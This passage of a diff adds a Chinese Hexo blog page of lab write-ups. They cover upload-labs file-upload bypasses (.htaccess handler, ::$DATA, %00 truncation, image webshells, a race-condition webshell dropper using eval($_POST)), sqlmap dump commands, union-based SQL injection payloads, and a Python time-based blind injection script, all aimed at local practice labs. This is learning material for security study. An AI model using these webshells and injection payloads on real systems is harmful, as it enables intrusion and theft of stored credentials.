+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-upload"><a href="#title-upload" class="headerlink" title="title:upload"></a>title:upload</h2><p>pass-01:<br>尝试直接上传一句话木马，发现页面显示文件不允许上传，只允许jpg,png,gif类型的文件上传<br>，说明上传被过滤了，由于这题只是前端过滤，因此我们可以先更改后缀名，然后通过burpsuit进行抓包，<br>绕过过滤之后再把文件的后缀名改回PHP的文件类型，这样就成功将php的一句话木马上传到了服务器。<br>方法二，由于是前端过滤直接把过滤函数删掉。或者加上允许php类型文件上传<br>————<br>pass-02:<br>提示是会在服务端对数据包的MIME进行检查，那么什么是数据包的MIME？<br>使用MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，使用MIME类型可以设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
+<p>在JSP页面中，contentType属性设置为：contentType&#x3D;“text&#x2F;html;charset&#x3D;GBK”。<br>这里我们直接上传PHP文件不会被限制，但是它会检查MIME类型，所以在抓包之后修改content-type的类型，将其改为image&#x2F;png绕过。<br>这题也可以和第一题一样先以jpg的形式上传，在抓包后再更改后缀名同样也行<br>————<br>pass-03:<br>查看源码，这里有一个黑名单，限制了一些文件类型的上传。但是这个我们可以通过例如php3,php4,php5,phtml,pht的后缀名绕过<br>————<br>pass-04:<br>还是黑名单，加强版。但是发现有一个文件是没有过滤，也就是.htaccess。<br>.htaccess基础知识<em>重点内容</em><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，<br>所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，<br>可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>它里面有这样一段代码：AllowOverride None，如果我们把None改成All<br>也就是说我们可以通过该文件将所有文件解析为php。<br>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。<br>这里我们上传的.htaccess文件内容是：SetHandler application&#x2F;x-httpd-php	这样所有文件都会解析为php<br>然后抓包的时候要把.htaccess前面的文件名删掉<br>然后我们上传图片马就可以了<br>————<br>pass-05:<br>黑名单继续，并且不允许上传.htaccess文件。但是没有将后缀进行大小写统一，我们可以通过大小写绕过。例如将后缀名改为Php。<br>另外他的过滤只进行一次，我们可以构建1.php.php的形式绕过。<br>pass-06同理，且由于没有进行去空格处理，可以在后缀名中加空格绕过。<br>————<br>pass05~07总结：<br>常见绕过方式：空格 大小写 只过滤一次，类似于参数污染<br>大小写统一的函数名称是strtolower()作用是转换为小写。将文件的后缀名用大小写混写绕过。<br>去空格的函数是trim（）进行首尾去空格处理。在文件名的后缀名前或后加上一个空格绕过<br>过滤文件名末尾的点的函数是deldot（）作用是删除文件名末尾的点。补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br>这样我们可以在文件的后缀名上加一个点进行绕过。这样利用windows特性，会自动去掉后缀名中最后的点，正常执行。<br>——————<br>pass-08：<br>补充知识：php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。<br>上传PHP一句话文件，抓包改后缀zoe.php::$DATA<br>然后使用蚁剑连接zoe.php （注意蚁剑连接路径不要加上::$DATA）<br>——————<br>pass-09：<br>由于路径拼接的是处理后的文件名，因此我们将后缀名取为.php. .（点+空格+点）），经过处理后的后缀名就变成了.php.就可以绕过。<br>——————<br>pass-10：<br>这里它的过滤使用了str_ireplace()函数，作用是把不合规范的后缀名准换为空，使文件上传失败，因此这里我们就可以采用双写绕过的方式，将后缀名写为.pphphp绕过<br>——————<br>pass-11：<br>这里是白名单验证通过，只有使用白名单的后缀名才可以通过。但是我们看到他的文件路径是直接拼接变量的方式，因此可以利用%00截断绕过（和之前sql注入的一个题目类似啊）<br>截断上传的前提条件：php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭。<br>原理是：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片<br>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。<br>知识补充：<br>strrpos(string,find[,start]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。<br>substr(string,start[,length])函数返回字符串的一部分(从start开始 [，长度为length])<br>magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对$_REQUEST, $_GET,$_POST,$_COOKIE 输入的内容进行过滤<br>$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;分析这一句代码，发现变量’save_path’是用户可以控制的上传变量，因此我们对<br>这个变量进行一些操作。可以通过一个例子详解的了解一下。<br>&lt;%<br>path&#x3D;”upload&#x2F;web&#x2F;“<br>file&#x3D;”1.jpg”<br>upfilename&#x3D;path &amp; file ‘最后的上传地址<br>%&gt;<br>将路径改为path&#x3D;”upload&#x2F;web&#x2F;1.php%00”,那么拼接之后，文件上传时就变成了<br>“upload&#x2F;web&#x2F;1.php%001.jpg”，这时上传便将1.php上传进去，而1.jpg则被截断，我理解的就是相对于省略符号，将后面的内容给省略了，相当于MySQL注入语句中的#、–+等<br>而截断了1 .jpg，但是1.jpg的内容是被1.php给继承过去了。因此我们才能够成功上传。<br>——————<br>pass-12：<br>改变了将变量的上传方式变为了post类型，其他一样。但是post类型不会像get类型一样对%00进行自动解码。因此我们在抓包之后先修改上传的路径名，加上muma.php+这里之所以要<br>加上一个加号是起到一个标记的功能，因为我们要将抓包修改后的数据发给decoder(编码器)文本都是以二进制显示的不方便找到修改的位置，而＋号的十六进制是2b，我们直接找到2b就可以了，<br>然后将2b修改为00编码后再发送。<br>——————<br>pass-13：<br>图片马的制作方式：第一种方法<br>我把图片命名为1.jpg</p>
+<p>接下来写一句话木马<br>新建一个2.asp文件，写入一句话木马<br>&lt;%Y&#x3D;request(“xindong”)%&gt; &lt;%execute(Y)%&gt;</p>
+<p>然后在win+R，cmd，cd到原始图片的目录路径下</p>
+<p>copy 1.jpg&#x2F;b+2.php&#x2F;a 3.jpg</p>
+<p>桌面上出现新的图片就是制作出的图片马</p>
+<p>第二种方法<br>通过工具C32将一句话木马插入到文件的最后<br>在制作好图片马之后上传就OK了<br>——————<br>pass-14:<br>知识补充，文件包含漏洞。<br>文件包含漏洞<br>文件包含<br>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件,无需再次编写,这种调用文件的过程通常称为包含。</p>
+<p>程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>
+<p>几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP&#x2F;ASP&#x2F;ASP.net程序中比较少。<br>漏洞产生的原因<br>1、web应用实现了动态包含<br>2、动态包含的文件路径参数，客户端可控</p>
+<p>PHP中的文件包含<br>*语句<br>PHP中提供了四个文件包含的函数,四个函数之间略有区别。如下函数区别<br>include()<br>文件包含失败时,会产生警告,脚本会继续运行。</p>
+<p>include_once()<br>与include()功能相同,文件只会被包含一次。</p>
+<p>require()<br>文件包含失败时,会产生错误,直接结束脚本执行。</p>
+<p>require_once()<br>与require()功能相同,文件只会被包含一次。</p>
+<p>*相关配置<br>文件包含是PHP的基本功能之一，有本地文件包含和远程文件包含之分(虽然php官网上不是这么解释的)。简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含<br>(HTTT, FTP, PHP伪协议)就是可以远程加载文件。我们可以通过php. ini来进行配置。如下</p>
+<p>allow_ url_ fopen&#x3D;0n&#x2F;0ff<br>本地文件包含(LFI)<br>allow_ url_ include&#x3D;0n&#x2F;0ff<br>远程文件包含(RFI)<br>更详细的链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/marsper/article/details/110291687?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%9B%BE%E7%89%87%E9%A9%AC&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-110291687.es_vector_control_group&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/marsper/article/details/110291687?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%9B%BE%E7%89%87%E9%A9%AC&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-110291687.es_vector_control_group&amp;spm=1018.2226.3001.4187</a></p>
+<p>因此这题的解决首先我要先在upload文件夹中写一个PHP文件存在文件包含漏洞，代码如下：<br><?php
+$file = $_GET[ 'file' ] ;
+include ($file);
+?><br>然后把文件名命名为include.php。分析一下这个代码，发现它会include方式执行图片马。(如果发现图片马没有办法执行，就换一个)<br>查看源码后，意思是：读取上传文件的前两个字节内容，unpack解码后，使用intval转换为10进制，默认为10进制，根据转换后的结果判断图片类型。<br>因此通过图片马达到绕过的目的<br>构建的payload：<a target="_blank" rel="noopener" href="http://localhost/upload-labs/upload/include.php?file=%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8815713.jpg%EF%BC%89">http://localhost/upload-labs/upload/include.php?file=图片文件名（15713.jpg）</a><br>———————<br>pass 15:<br>与pass 14没有太大差别，通过getimagesize()检查是否为图片文件，所以还是可以用第十四关的图片马绕过，并使用文件包含漏洞解析图片马。<br>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
+<p>语法格式：</p>
+<p>array getimagesize ( string $filename [, array &amp;$imageinfo ] )<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。<br>索引 0 给出的是图像宽度的像素值<br>索引 1 给出的是图像高度的像素值<br>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM<br>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签<br>索引 bits 给出的是图像的每种颜色的位数，二进制格式<br>索引 channels 给出的是图像的通道值，RGB 图像默认是 3<br>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image&#x2F;jpeg”);<br>——————<br>pass 15:<br>这一关使用exif_imagetype()来判断图像的类型。<br>exif_imagetype — 用于判断一个图像的类型，读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。</p>
+<p>如果不是真实的图像，则会获取信息失败，所以要绕过该检测方式也需要用到图片一句话木马。方法同Pass13，需要配合文件包含漏洞或文件解析漏洞。<br>需要开启php_exif模块<br>——————<br>pass 16:<br>什么是二次渲染：二次渲染，就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。在二次渲染的过程中，我们图片中所写的木马也可能会被渲染掉。<br>绕过二次渲染的核心思想便是先上传一张图片，再将上传完成后的图片下载下来，对比渲染前后图片的编码变化，将我们的代码写在未被渲染的区域便可绕过二次渲染。发现burpsuit的camparer可以实现。没有标记颜色的就是渲染没有改变的地方，在这里写入一句话木马。<br>由于不同格式文件的特性，在进行绕过二次渲染时，选用gif的图像最容易成功，对于jpg和png这两种图片需要用脚本进行改写。<br>——————<br>pass 17:<br>关于线程和进程的知识补充：<br>进程：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p>
+<p>线程：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄 存器和栈),<br>但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br>条件竞技：条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。<br>因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>代码审计发现：对于上传的文件处理是先保存到服务器，再对比拓展名，如果拓展名不属于白名单中的三种后缀，便由18行的操作执行unlink操作将保存的文件删除。这里的突破口是我们上传的文件会先被放到服务器上，再进行 白名单验证，如果不符合条件再通过unlink函数删掉这个文件，<br>那么这里的bug就是不管我们的文件是否会被删掉，都会先被上传到服务器，只要我们能够做到在服务器执行unlink函数的功能之前访问上传的文件，那么就能够成功写入websheel。<br>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件。<br>于是我们就可以通过burpsuit不断对目标网站发起访问请求。<br>在上传以后储存在服务器，到检查不通过的这段时间如果我们可以利用起来，就算后续他将文件删除了也无所谓，那么这段时间太短了，如何将其放大？那就利用burp的intruder，随便弄一个peyload让他在那边跑就行，然后我们在浏览器中直接访问该文件<br>我们构建这样的一个webshell:<?php fputs(fopen('attack.php','w'),'<?php @eval($_POST["attack"])?>‘);?&gt;<br>把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个attack.php的一句话。<br>接下来进行操作。<br>首先，我们上传PHP文件，用BP拦截<br>然后选择Clear$<br>接着设置无限发送空的Payloads，来让它一直上传该文件<br>把线程设置高一点<br>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件</p>
+<p>python脚本：<br>import requests<br>url &#x3D; “<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;">http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;</a><br>while True:<br>    html &#x3D; requests.get(url)<br>    if html.status_code &#x3D;&#x3D; 200:<br>        print(“OK”)<br>        break<br>脚本的url地址XXX都是代表IP地址<br>接下来我们可以在BP点击开始攻击<br>可以看到上传该文件的数据包不停地在进行重放。</p>
+<p>在BP攻击的同时我们也要运行python脚本，目的就是不停地访问attack.php知道成功访问到为止。当出现OK说明访问到了该文件，那么attack.php应该也创建成功了，用蚁剑连一下试试。<br>————————<br>pass 18：<br>没有太大的差别，只是我们上传的木马要改成图片马。<br>————————<br>pass 19:<br>开始本关之前，先来了解一下什么是00截断：</p>
+<p>事实上0x00，%00这两类截断都是属于同种原理，%00在url解码后为空字符，0X00即16进制的00，只是表示和用法不同而已<br>无论0x00还是%00，最终被解析后都是一个东西:chr（0）</p>
+<p>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p>
+<p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p>
+<p>举例说明：<br>当我们在GET场景上传一个名为eval.php%00.jpg的文件，后台程序收到此文件后，开始检测其名称，当检测到%00后产生截断，不再继续解析%00之后的内容。于是，系统上存储的实际为eval.php。</p>
+<p>如何利用%00以及0x00截断：<br>1.php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
+<p>2.magic_quotes_gpc需要为OFF状态<br>当打开magic_quotes_gpc时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL字符（%00）都会被自动加上一个反斜杠进行转义。</p>
+<p>3.文件路径可控（即本关卡），比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads&#x2F;，就可以直接把路径构造成uploads&#x2F;xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃</p>
+<p>一般来说，在GET传参时，由于url中的内容会进行url编码，而%00在经过解码之后便是空字符导致截断。<br>而在在POST传参时， POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 进行截断。<br>本关用到了move_uploaded_file()，由POST方式获取文件，因此可以使用13关的过关方式：%00截断，更改Hex中的十六进制码即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/upload/" data-id="cl22vvyyq000kl4vj374u54b3" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sql注入原理和sqlmap的基本使用语句" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8Csqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E8%AF%AD%E5%8F%A5/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.555Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8Csqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E8%AF%AD%E5%8F%A5/">sql注入原理和sqlmap的基本操作</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>通过post请求和get请求执行输入的sql 语句<br>SQL注入攻击的流程<br>判断是否可以注入（有无注入点）<br>获得数据库名<br>获得表名<br>获得列名<br>获得数据</p>
+<p>sqlmap的几个常用指令<br>1、Sqlmap.py -u”URL”     返回是否有注入点,注入类型和指令 返回使用的语言类型 返回服务器（apache）类型 返回dbms（数据库管理系统. Mysql）<br>2、sqlmap.py -u”<a target="_blank" rel="noopener" href="http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;">http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;</a> –current db 返回当前使用的数据库的名称<br>3、sqlmap.py -u”<a target="_blank" rel="noopener" href="http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;">http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;</a> –level&#x3D;5 –risk&#x3D;3 –dbms&#x3D;mysql -D”security” –tables 查找数据库中所有表的名称<br>4、sqlmap.py -u”<a target="_blank" rel="noopener" href="http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;">http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;</a> –level&#x3D;5 –risk&#x3D;3 –dbms&#x3D;mysql -D”security” -T”users” –col 查找表中的列的名字<br>5、sqlmap.py -u”<a target="_blank" rel="noopener" href="http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;">http://127.0.0.12/sqli-labs-master/Less-2/?id=1&quot;</a> –level&#x3D;5 –risk&#x3D;3 –dbms&#x3D;mysql -D”security” -T”users” -C”password,username” –dump 最后执行—dump语句得到列中的信息</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8Csqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E8%AF%AD%E5%8F%A5/" data-id="cl22vvyyo000hl4vj6evkghk6" data-title="sql注入原理和sqlmap的基本操作" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sql手写注入基本语法与sqli-labs less1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.551Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/">sql手写注入基本语法与sqli-labs less1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>SQL注入的基本原理和常用语法<br>通过引号的闭合完成get类型的注入<br>或者用payload注释掉后面的语句<br>详细看这个链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/160352.html">https://www.freebuf.com/articles/web/160352.html</a><br>less 1 的详细<br>判断有没有注入点<br>判断注入点的闭合方式 通过看页面的回显<br>判断字段数，通过 order by函数，payload：？id&#x3D;1’ order by 3–+超过的话会报错，运用数学的二分法<br>将语句闭合并且 and 0<br>select1,2,database()–+查询当前数据库<br>union select 1,2,group_concat(schema_name) from information_schema.schema–+通过该语句查询所有的数据库<br>这里用了group_concat()函数和调用了 information_schema库<br>还可以通过payload：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+查询数据库<br>?id&#x3D;1’ and 0衔接union select 1，2，group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+通过该语句查询security数据库当中的所有表<br>接下来是通过明锐的嗅觉构建payload：?id&#x3D;1’ and 0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+通过该语句查询表中的列<br>接下来是查看这个列中的字段值了，payload：id&#x3D;1’ and 0 union select 1,2,group_concat(id,username,passwprd) from users–+ </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/" data-id="cl22vvyyo000gl4vj3ek54c6c" data-title="sql手写注入基本语法与sqli-labs less1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-python盲注脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.548Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding:utf-8"></a>coding:utf-8</h1><p>import requests<br>import datetime<br>import time</p>
+<h1 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h1><p>def database_len():<br>    for i in range(1, 10):<br>        url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>        payload &#x3D; “ ?id&#x3D;1’ and if(length(database())&gt;%s,sleep(1),0) –+” % i<br>        # print(url+payload+’%23’)<br>        time1 &#x3D; datetime.datetime.now()<br>        r &#x3D; requests.get(url + payload)<br>        time2 &#x3D; datetime.datetime.now()<br>        sec &#x3D; (time2 - time1).seconds<br>        if sec &gt;&#x3D; 1:<br>            print(i)<br>        else:<br>            print(i)<br>            break<br>    print(‘database_len:’, i)</p>
+<p>#获取数据库名<br>def database_name():<br>    name &#x3D; ‘’<br>    for j in range(1,9):<br>        for i in ‘0123456789abcdefghijklmnopqrstuvwxyz’:<br>            url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>            payload &#x3D; “?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) –+” % (j,i)<br>            #print(url+payload)<br>            time1 &#x3D; datetime.datetime.now()<br>            r &#x3D; requests.get(url + payload)<br>            time2 &#x3D; datetime.datetime.now()<br>            sec &#x3D; (time2 - time1).seconds<br>            if sec &gt;&#x3D;3:<br>                name +&#x3D; i<br>                print(name)<br>                break<br>    print(‘database_name:’, name)</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    database_name()<br>?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) – +<br>暴表：<br>?id&#x3D;1’ and if(substr(select table_ name from information_schema.tables where table_schema&#x3D;database(),%d,1))<br>爆列：<br>?id&#x3D;1’ and if(substr(select columns_name from infomation_schema.columns where table_shema&#x3D;database(),%d,1))<br>————————————————</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" data-id="cl22vvyyp000il4vjdmkw0010" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2038~42/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/LESS%2032~37/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2029~31/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2018~22/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
